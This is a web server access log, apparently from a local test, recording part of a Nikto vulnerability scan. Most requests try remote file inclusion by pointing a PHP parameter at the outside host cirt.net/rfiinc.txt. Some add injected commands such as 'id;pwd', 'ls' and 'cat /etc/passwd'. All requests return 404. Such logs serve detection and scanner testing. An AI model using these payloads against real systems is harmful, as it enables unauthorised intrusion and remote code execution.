172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /upload/admin/frontpage_right.php?loadadminpage=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006006)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /upload/top.php?maindir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006007)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /upload/xax/admin/modules/install_module.php?level=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 534 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006008)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /upload/xax/admin/patch/index.php?level=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006009)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /upload/xax/ossigeno/admin/install_module.php?level=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 535 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006010)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /upload/xax/ossigeno/admin/uninstall_module.php?level=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 537 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006011)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /upload_local.php?target=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006012)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /upload_multi.php?target=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006013)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /urlinn_includes/config.php?dir_ws=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006014)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /user.php?caselist[bad_file.txt][path]=http://cirt.net/rfiinc.txt?&command=cat%20/etc/passwd HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006015)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /user_language.php?INDM=r3d.w0rm&language_dir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006016)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /user_new_2.php?home=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006017)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /usr/extensions/get_calendar.inc.php?root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 526 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006018)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /usr/extensions/get_infochannel.inc.php?root_path=http://cirt.net/rfiinc.txt??cmd=id;pwd HTTP/1.1" 404 529 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006019)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /usr/extensions/get_tree.inc.php?GLOBALS[\\\"root_path\\\"]=http://cirt.net/rfiinc.txt??cmd=id;pwd HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006020)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /usr/extensions/get_tree.inc.php?GLOBALS[root_path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006021)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /utilitaires/gestion_sondage.php?repertoire_visiteur=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006022)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /utilitaires/gestion_sondage.php?repertoire_visiteur=http://cirt.net/rfiinc.txt??&cmd=ls HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006023)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /utils/class_HTTPRetriever.php?libcurlemuinc=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006024)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /v-webmail/includes/mailaccess/pop3.php?CONFIG[pear_dir]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 529 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006025)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /vCard/admin/define.inc.php?match=http://cirt.net/rfiinc.txt??&cmd=id HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006026)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /vb/includes/functions.php?classfile=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006027)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /vb/includes/functions_cron.php?nextitem=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006028)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /vb/includes/functions_forumdisplay.php?specialtemplates=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 529 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006029)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /vbgsitemap/vbgsitemap-config.php?base=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006030)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /vbgsitemap/vbgsitemap-vbseo.php?base=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006031)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /vedit/editor/edit_htmlarea.php?highlighter=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006032)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /viart_cms-3.3.2/blocks/block_site_map.php?root_folder_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 532 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006033)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /view.php?ariadne=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006034)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /view.php?id=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006035)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /view_func.php?i=http://cirt.net/rfiinc.txt?&l=testfile.txt? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006036)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /views/print/printbar.php?views_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006037)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /visible_count_inc.php?statitpath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006038)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /visitor.php?_SERVER[DOCUMENT_ROOT]=http://cirt.net/rfiinc.txt??? HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006039)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /volume.php?config[public_dir]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006040)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /vote.php?Madoa=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006041)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /votebox.php?VoteBoxPath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006042)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /vp/configure.php?phpbb_root_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006043)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /vwebmail/includes/mailaccess/pop3/core.php?CONFIG[pear_dir]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 533 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006044)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /w-agora_path/add_user.php?bn_dir_default=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006045)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /w-agora_path/create_forum.php?bn_dir_default=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006046)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /w-agora_path/create_user.php?bn_dir_default=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006047)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /w-agora_path/delete_notes.php?bn_dir_default=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006048)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /w-agora_path/delete_user.php?bn_dir_default=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006049)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /w-agora_path/edit_forum.php?bn_dir_default=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006050)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /w-agora_path/mail_users.php?bn_dir_default=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006051)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /w-agora_path/moderate_notes.php?bn_dir_default=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006052)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /w-agora_path/reorder_forums.php?bn_dir_default=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006053)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /wamp_dir/setup/yesno.phtml?no_url=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006054)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /wapchat/src/eng.adCreate.php?sysFileDir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006055)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /wapchat/src/eng.adCreateSave.php?sysFileDir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006056)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /wapchat/src/eng.adDispByTypeOptions.php?sysFileDir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 530 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006057)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /wapchat/src/eng.createRoom.php?sysFileDir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006058)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /wapchat/src/eng.forward.php?sysFileDir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006059)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /wapchat/src/eng.pageLogout.php?sysFileDir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006060)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /wapchat/src/eng.resultMember.php?sysFileDir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006061)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /wapchat/src/eng.roomDeleteConfirm.php?sysFileDir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 528 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006062)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /wapchat/src/eng.saveNewRoom.php?sysFileDir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006063)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /wapchat/src/eng.searchMember.php?sysFileDir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006064)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /wapchat/src/eng.writeMsg.php?sysFileDir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006065)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /war.php?vwar_root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006066)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /war.php?vwar_root=http://cirt.net/rfiinc.txt??&cmd=ls HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006067)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /warn.php?file=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006068)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /watermark.php?GALLERY_BASEDIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006069)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /wbxml/WBXML/Decoder.php?base_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006070)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /wbxml/WBXML/Encoder.php?base_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006071)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/Administration/Includes/configureText.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 536 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006072)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/Administration/Includes/contentHome.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 534 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006073)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/Administration/Includes/deleteContent.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 536 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006074)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/Administration/Includes/deleteUser.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 533 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006075)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/Administration/Includes/userHome.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 531 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006076)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules//Module/Module.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 530 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006077)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/AboutUserModule/AboutUserModule.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 547 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006078)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/AddGroupModule/AddGroupModule.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 545 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006079)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/AddMessageModule/AddMessageModule.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 549 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006080)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/AudiosMediaGalleryModule/AudiosMediaGalleryModule.php?current_blockmodule_pathhttp://cirt.net/rfiinc.txt? HTTP/1.1" 404 565 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006081)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/CustomizeUIModule/desktop_image.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 547 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006082)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/EditProfileModule/DynamicProfile.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 548 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006083)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/EditProfileModule/external.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 542 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006084)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/EnableModule/EnableModule.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 541 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006085)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/ExternalFeedModule/ExternalFeedModule.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 552 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006086)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/FlickrModule/FlickrModule.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 540 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006087)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/GroupForumModule/GroupForumModule.php?path_prefixhttp://cirt.net/rfiinc.txt? HTTP/1.1" 404 548 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006088)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/GroupForumPermalinkModule/GroupForumPermalinkModule.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 566 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006089)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/GroupModerateContentModule/GroupModerateContentModule.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 568 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006090)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/GroupModerateUserModule/GroupModerateUserModule.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 562 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006091)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/GroupModerationModule/GroupModerationModule.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 558 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006092)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/GroupsCategoryModule/GroupsCategoryModule.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 556 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006093)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/GroupsDirectoryModule/GroupsDirectoryModule.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 558 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006094)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/ImagesMediaGalleryModule/ImagesMediaGalleryModule.php?current_blockmodule_pathhttp://cirt.net/rfiinc.txt? HTTP/1.1" 404 529 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006095)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/ImagesModule/ImagesModule.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 542 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006096)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/InvitationStatusModule/InvitationStatusModule.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 561 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006097)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/LargestGroupsModule/LargestGroupsModule.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 555 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006098)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/LinksModule/LinksModule.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 539 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006099)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/LoginModule/remoteauth_functions.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 548 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006100)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/LogoModule/LogoModule.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 537 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006101)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/MediaFullViewModule/MediaFullViewModule.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 555 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006102)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/MediaManagementModule/MediaManagementModule.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 559 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006103)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/MembersFacewallModule/MembersFacewallModule.php?current_blockmodule_pathhttp://cirt.net/rfiinc.txt? HTTP/1.1" 404 559 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006104)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/MessageModule/MessageModule.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 543 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006105)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/ModuleSelectorModule/ModuleSelectorModule.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 557 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006106)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/MyGroupsModule/MyGroupsModule.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 545 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006107)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/MyLinksModule/MyLinksModule.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 543 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006108)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/MyNetworksModule.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 532 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006109)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/NetworkAnnouncementModule/NetworkAnnouncementModule.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 567 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006110)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/NetworkDefaultControlModule/NetworkDefaultControlModule.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 571 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006111)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/NetworkDefaultLinksModule/NetworkDefaultLinksModule.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 567 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006112)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/NetworkModerateUserModule/NetworkModerateUserModule.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 567 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006113)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/NetworkResultContentModule/NetworkResultContentModule.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 569 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006114)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/NetworkResultUserModule/NetworkResultUserModule.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 563 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006115)"
